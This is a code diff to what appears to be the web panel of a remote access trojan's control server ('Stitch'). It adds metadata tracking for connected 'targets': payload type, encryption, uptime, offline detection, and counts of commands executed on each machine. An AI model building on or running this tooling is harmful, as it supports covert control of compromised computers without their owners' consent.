@@ -1624,11 +1624,12 @@ def _perform_handshake(sock, addr):
 def sync_stitch_targets():
     """
     Synchronize Stitch server connections with web app state
-    Returns list of connected targets for UI
+    Returns list of connected targets for UI with enhanced metadata
     """
     try:
         server = get_stitch_server()
         targets = []
+        current_time = time.time()
         
         for target_id, sock in server.inf_sock.items():
             # Get or create connection context
@@ -1636,28 +1637,34 @@ def sync_stitch_targets():
                 # Detect payload type
                 payload_type = native_bridge.detect_payload_type(sock)
                 
-                # Create basic context
+                # Create enhanced context
                 connection_context[target_id] = {
                     'id': target_id,
                     'ip': target_id.split(':')[0] if ':' in target_id else target_id,
                     'port': target_id.split(':')[1] if ':' in target_id else 'unknown',
-                    'connected_at': time.time(),
-                    'last_seen': time.time(),
+                    'connected_at': current_time,
+                    'last_seen': current_time,
                     'payload_type': payload_type,
                     'os': f'{payload_type.capitalize()} Payload',
                     'hostname': target_id,
                     'user': 'unknown',
-                    'status': 'online'
+                    'status': 'online',
+                    'encryption': 'AES-256-CTR' if payload_type == 'native' else 'Legacy',
+                    'version': 'Unknown',
+                    'commands_executed': 0,
+                    'last_command': None,
+                    'uptime': 0
                 }
                 
-                log_debug(f"New target detected: {target_id} ({payload_type})", "INFO", "Sync")
+                log_debug(f"New target detected: {target_id} ({payload_type}, encrypted)", "INFO", "Sync")
                 
-            # Update last seen
-            connection_context[target_id]['last_seen'] = time.time()
-            connection_context[target_id]['status'] = 'online'
-            
-            # Add to targets list
+            # Update dynamic fields
             ctx = connection_context[target_id]
+            ctx['last_seen'] = current_time
+            ctx['status'] = 'online'
+            ctx['uptime'] = current_time - ctx.get('connected_at', current_time)
+            
+            # Add to targets list with full metadata
             targets.append({
                 'id': target_id,
                 'ip': ctx.get('ip'),
@@ -1666,10 +1673,24 @@ def sync_stitch_targets():
                 'os': ctx.get('os'),
                 'user': ctx.get('user'),
                 'payload_type': ctx.get('payload_type'),
+                'encryption': ctx.get('encryption'),
+                'version': ctx.get('version'),
                 'connected_at': ctx.get('connected_at'),
                 'last_seen': ctx.get('last_seen'),
-                'status': 'online'
+                'uptime': ctx.get('uptime'),
+                'status': 'online',
+                'commands_executed': ctx.get('commands_executed', 0),
+                'last_command': ctx.get('last_command')
             })
+            
+        # Mark offline targets
+        active_ids = set(server.inf_sock.keys())
+        for target_id in list(connection_context.keys()):
+            if target_id not in active_ids:
+                ctx = connection_context[target_id]
+                if ctx.get('status') == 'online':
+                    ctx['status'] = 'offline'
+                    log_debug(f"Target went offline: {target_id}", "INFO", "Sync")
             
         return targets
         
@@ -1748,6 +1769,12 @@ def execute_real_command(command, conn_id=None, parameters=None):
         duration = time.time() - start_time
         metrics_collector.increment_counter('total_commands')
         metrics_collector.record_duration('command_duration', duration)
+        
+        # Update target metadata
+        if conn_id in connection_context:
+            connection_context[conn_id]['commands_executed'] = connection_context[conn_id].get('commands_executed', 0) + 1
+            connection_context[conn_id]['last_command'] = command
+            connection_context[conn_id]['last_seen'] = time.time()
         
         return result_output
         
